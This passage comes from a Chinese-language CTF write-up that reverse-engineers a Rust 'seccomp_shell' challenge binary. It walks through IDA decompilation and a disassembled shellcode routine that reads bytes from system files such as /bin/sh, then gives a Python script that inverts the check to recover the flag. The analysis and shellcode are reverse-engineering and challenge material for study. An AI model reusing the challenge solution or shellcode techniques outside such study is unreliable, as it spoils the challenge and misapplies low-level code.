punctuation\">(</span> v84 <span class=\"token operator\">&lt;</span> <span class=\"token number\">205</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v78 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>dest <span class=\"token operator\">+</span> like_i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    v79 <span class=\"token operator\">=</span> v82<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    v82<span class=\"token punctuation\">[</span><span class=\"token number\">204</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">&lt;</span> <span class=\"token number\">224</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">223</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">205</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">==</span> <span class=\"token number\">224</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">224</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">206</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">&lt;</span> <span class=\"token number\">226</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">225</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">207</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> input<span class=\"token punctuation\">[</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v77 <span class=\"token operator\">==</span> <span class=\"token number\">226</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_74<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    v79<span class=\"token punctuation\">[</span><span class=\"token number\">226</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v78<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _$LT$$RF$std<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>tcp<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>TcpStream$u20$as$u20$std<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>Write$GT$<span class=\"token double-colon punctuation\">::</span>write<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">h0bbfc2d1fa700c7a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_50<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v75 <span class=\"token operator\">=</span> std<span class=\"token double-colon punctuation\">::</span>io<span class=\"token double-colon punctuation\">::</span>default_read_exact<span class=\"token double-colon punctuation\">::</span><span class=\"token function\">h61fb53e2a02eb302</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v85<span class=\"token punctuation\">,</span> v81<span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v75 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_55<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v81<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token keyword\">goto</span> LABEL_70<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    v80 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>like_i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    like_i <span class=\"token operator\">+=</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v80 <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>每次是赋值了 input 的 4 个字节 和比较数据的四个字节 但是不清楚跑哪里去了</p>\n<p>而 v79 [204]  v79 [205]  v79 [206]  v79 [207] 是栈中固定的位置，为什么下标怎么奇怪呢？</p>\n<p>通过查找交叉引用可以发现</p>\n<p><img data-src=\"/images/image-20230910154028581.png\" alt=\"image-20230910154028581\"></p>\n<p>v79 是一开始 255 字节长的 shellcode</p>\n<p><img data-src=\"/images/image-20230910154115378.png\" alt=\"image-20230910154115378\"></p>\n<p>IDA 有些识别不太准确 在汇编中查看</p>\n<pre><code class=\"language-assembly\">.rodata:000055E808DA1B2B sub_55E808DA1B2B proc near              ; DATA XREF: seccomp_shell::shell::verify::h898bf5fa26dafbab+44D↑o\n.rodata:000055E808DA1B2B push    rsp\n.rodata:000055E808DA1B2C pop     rbp\n.rodata:000055E808DA1B2D xor     esi, esi                        ; flags\n.rodata:000055E808DA1B2F mov     rcx, 379F3A62B80657A1h\n.rodata:000055E808DA1B39 mov     rdx, 37F7494DD66F358Eh\n.rodata:000055E808DA1B43 xor     rcx, rdx\n.rodata:000055E808DA1B46 push    rcx\n.rodata:000055E808DA1B47 push    rsp\n.rodata:000055E808DA1B48 pop     rdi                             ; filename\n.rodata:000055E808DA1B49 push    2\n.rodata:000055E808DA1B4B pop     rax\n.rodata:000055E808DA1B4C cdq                                     ; mode\n.rodata:000055E808DA1B4D syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1B4F xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1B51 xor     eax, eax\n.rodata:000055E808DA1B53 push    rax\n.rodata:000055E808DA1B54 push    rsp\n.rodata:000055E808DA1B55 pop     rsi                             ; buf\n.rodata:000055E808DA1B56 push    4\n.rodata:000055E808DA1B58 pop     rdx                             ; count\n.rodata:000055E808DA1B59 syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1B5B pop     r12\n.rodata:000055E808DA1B5D push    3\n.rodata:000055E808DA1B5F pop     rax\n.rodata:000055E808DA1B60 syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1B62 xor     esi, esi                        ; flags\n.rodata:000055E808DA1B64 mov     rcx, 0AAC06463C36F3B3Bh\n.rodata:000055E808DA1B6E mov     rdx, 0AAC06463C30B4C48h\n.rodata:000055E808DA1B78 xor     rcx, rdx\n.rodata:000055E808DA1B7B push    rcx\n.rodata:000055E808DA1B7C mov     rcx, 7DA9F8D67582578Ch\n.rodata:000055E808DA1B86 mov     rdx, 0EC888F916F632A3h\n.rodata:000055E808DA1B90 xor     rcx, rdx\n.rodata:000055E808DA1B93 push    rcx\n.rodata:000055E808DA1B94 push    rsp\n.rodata:000055E808DA1B95 pop     rdi                             ; filename\n.rodata:000055E808DA1B96 push    2\n.rodata:000055E808DA1B98 pop     rax\n.rodata:000055E808DA1B99 cdq                                     ; mode\n.rodata:000055E808DA1B9A syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1B9C xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1B9E xor     eax, eax\n.rodata:000055E808DA1BA0 push    rax\n.rodata:000055E808DA1BA1 push    rsp\n.rodata:000055E808DA1BA2 pop     rsi                             ; buf\n.rodata:000055E808DA1BA3 push    4\n.rodata:000055E808DA1BA5 pop     rdx                             ; count\n.rodata:000055E808DA1BA6 syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1BA8 pop     r13\n.rodata:000055E808DA1BAA push    3\n.rodata:000055E808DA1BAC pop     rax\n.rodata:000055E808DA1BAD syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1BAF xor     esi, esi                        ; flags\n.rodata:000055E808DA1BB1 push    6Fh ; 'o'\n.rodata:000055E808DA1BB3 mov     rcx, 77D9F62D0C06E559h\n.rodata:000055E808DA1BBD mov     rdx, 5BC8C027A638176h\n.rodata:000055E808DA1BC7 xor     rcx, rdx\n.rodata:000055E808DA1BCA push    rcx\n.rodata:000055E808DA1BCB push    rsp\n.rodata:000055E808DA1BCC pop     rdi                             ; filename\n.rodata:000055E808DA1BCD push    2\n.rodata:000055E808DA1BCF pop     rax\n.rodata:000055E808DA1BD0 cdq                                     ; mode\n.rodata:000055E808DA1BD1 syscall                                 ; LINUX - sys_open\n.rodata:000055E808DA1BD3 xchg    rax, rdi                        ; fd\n.rodata:000055E808DA1BD5 xor     eax, eax\n.rodata:000055E808DA1BD7 push    rax\n.rodata:000055E808DA1BD8 push    rsp\n.rodata:000055E808DA1BD9 pop     rsi                             ; buf\n.rodata:000055E808DA1BDA push    4\n.rodata:000055E808DA1BDC pop     rdx                             ; count\n.rodata:000055E808DA1BDD syscall                                 ; LINUX - sys_read\n.rodata:000055E808DA1BDF pop     rax\n.rodata:000055E808DA1BE0 not     rax\n.rodata:000055E808DA1BE3 shr     rax, 1Dh\n.rodata:000055E808DA1BE7 cqo\n.rodata:000055E808DA1BE9 push    29h ; ')'\n.rodata:000055E808DA1BEB pop     rcx\n.rodata:000055E808DA1BEC div     rcx\n.rodata:000055E808DA1BEF xchg    rax, r14\n.rodata:000055E808DA1BF1 push    3\n.rodata:000055E808DA1BF3 pop     rax\n.rodata:000055E808DA1BF4 syscall                                 ; LINUX - sys_close\n.rodata:000055E808DA1BF6 mov     eax, 267814C2h\n.rodata:000055E808DA1BFB add     eax, r12d\n.rodata:000055E808DA1BFE xor     eax, r13d\n.rodata:000055E808DA1C01 ror     eax, 0Bh\n.rodata:000055E808DA1C04 not     eax\n.rodata:000055E808DA1C06 xor     eax, r14d\n.rodata:000055E808DA1C09 cmp     eax, 31FF2788h\n.rodata:000055E808DA1C0E jnz     short loc_55E808DA1C15\n.rodata:000055E808DA1C0E\n.rodata:000055E808DA1C10 push    1\n.rodata:000055E808DA1C12 pop     rax\n.rodata:000055E808DA1C13 jmp     short loc_55E808DA1C18\n.rodata:000055E808DA1C13\n.rodata:000055E808DA1C15 ; ---------------------------------------------------------------------------\n.rodata:000055E808DA1C15\n.rodata:000055E808DA1C15 loc_55E808DA1C15:                       ; CODE XREF: sub_55E808DA1B2B+E3↑j\n.rodata:000055E808DA1C15 xor     rax, rax\n.rodata:000055E808DA1C15\n.rodata:000055E808DA1C18\n.rodata:000055E808DA1C18 loc_55E808DA1C18:                       ; CODE XREF: sub_55E808DA1B2B+E8↑j\n.rodata:000055E808DA1C18 push    rax\n.rodata:000055E808DA1C19 push    rbx\n.rodata:000055E808DA1C1A pop     rdi                             ; fd\n.rodata:000055E808DA1C1B push    rsp\n.rodata:000055E808DA1C1C pop     rsi                             ; buf\n.rodata:000055E808DA1C1D push    8\n.rodata:000055E808DA1C1F pop     rdx                             ; count\n.rodata:000055E808DA1C20 push    1\n.rodata:000055E808DA1C22 pop     rax\n.rodata:000055E808DA1C23 syscall                                 ; LINUX - sys_write\n.rodata:000055E808DA1C25 push    rbp\n.rodata:000055E808DA1C26 pop     rsp\n.rodata:000055E808DA1C27 jmp     r15\n.rodata:000055E808DA1C27\n.rodata:000055E808DA1C27 sub_55E808DA1B2B endp\n.rodata:000055E808DA1C27\n</code></pre>\n<p>发现之前赋值的 input 和比较数据都跑这里来了</p>\n<p><img data-src=\"/images/image-20230910154637077.png\" alt=\"image-20230910154637077\"></p>\n<p><strong>add     eax, r12d</strong> #首先将 eax 与 r12d 相加<br>\n<strong> xor     eax, r13d</strong> #然后将 eax 与 r13d 进行异或运算<br>\n<strong> ror     eax, 0Bh</strong> #接着将 eax 向右旋转 11 位<br>\n<strong> not     eax</strong># 然后对 eax 求反<br>\n<strong> xor     eax, r14d</strong># 再将 eax 与 r14d 进行异或运算</p>\n<p>关键就是上面几条汇编指令了 对 input 还进行了操作</p>\n<p>关键就是找到 r12 r13 r14 的值</p>\n<p>但这个 shellcode 在程序中好像没有拿出来执行 (也可能是因为我不会调)</p>\n<p>而且这个程序好像就单纯的验证了服务器端和客服端的输入是否相同 有点闹麻</p>\n<p><img data-src=\"/images/image-20230910163931689.png\" alt=\"image-20230910163931689\"></p>\n<p>(有一个 std::io::default_read_exact 是从客服端接受，从 IDA 动态调试会卡住也能发现这一点)</p>\n<p>分析 shellcode 可以得出 r12 r13 r14 是定值</p>\n<p>分析方法：随便找一个简单的程序 用 IDApatch 成 shellcode 执行一下就行了</p>\n<p>直接用 lazyIDA paste data</p>\n<p><img data-src=\"/images/image-20230910180732823.png\" alt=\"image-20230910180732823\"></p>\n<p><img data-src=\"/images/image-20230910181123412.png\" alt=\"image-20230910181123412\"></p>\n<p>可以发现 r12 r13 r14 的定值是多少 然后就直接写 exp 脚本解得 flag 就 OK 了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    tmp<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_order</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">:</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">,</span> table<span class=\"token punctuation\">:</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span>table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 定义一个函数，接受一个参数，返回解密后的值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">de_cmp</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\"># 定义 r12, r13, r14 的值</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r12 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000464C457F</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    r13 <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000746F6F72</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r14 <span class=\"token operator\">=</span> <span class=\"token number\">0x000000031F3831F</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\"># 将 x 转换为无符号 32 位整数</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\"># 将 x 与 r14 异或</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">^</span> r14<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># 将 x 取反</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\"># 将 x 左旋 11 位</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\"># 将 x 与 r13 异或</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">^</span> r13<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\"># 将 x 减去 r12</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>uint32<span class=\"token punctuation\">(</span>x <span class=\"token operator\">-</span> r12<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\"># 打印 x 的十六进制表示</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token comment\"># 将 x 转换为有符号 32 位整数</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    x <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>int32<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># 返回 x 的四个字节</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff0000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff000000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#get crypto table</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>s0_255 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token 